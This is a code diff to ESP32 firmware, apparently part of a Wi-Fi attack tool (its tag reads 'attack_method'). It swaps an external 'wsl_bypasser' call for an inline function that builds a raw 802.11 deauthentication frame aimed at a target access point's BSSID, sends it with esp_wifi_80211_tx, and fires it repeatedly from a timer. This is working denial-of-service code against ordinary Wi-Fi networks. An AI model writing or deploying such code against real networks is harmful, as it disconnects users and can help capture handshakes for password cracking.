@@ -16,10 +16,30 @@
 #include "esp_wifi_types.h"
 
 #include "wifi_controller.h"
-#include "wsl_bypasser.h"
 
 static const char *TAG = "main:attack_method";
 static esp_timer_handle_t deauth_timer_handle;
+
+// Deauthentication frame template
+static const uint8_t deauth_frame_default[] = {
+    0xc0, 0x00, 0x3a, 0x01,
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0xf0, 0xff, 0x02, 0x00
+};
+
+static void send_deauth_frame(const wifi_ap_record_t *ap_record) {
+    uint8_t deauth_frame[sizeof(deauth_frame_default)];
+    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+
+    // Set the BSSID of the AP
+    memcpy(&deauth_frame[10], ap_record->bssid, 6);
+    memcpy(&deauth_frame[16], ap_record->bssid, 6);
+
+    // Send the deauthentication frame
+    esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+}
 
 /**
  * @brief Callback for periodic deauthentication frame timer
@@ -29,7 +49,7 @@ static esp_timer_handle_t deauth_timer_handle;
  * @param arg expects wifi_ap_record_t
  */
 static void timer_send_deauth_frame(void *arg){
-    wsl_bypasser_send_deauth_frame((wifi_ap_record_t *) arg);
+    send_deauth_frame((wifi_ap_record_t *) arg);
 }
 
 /**
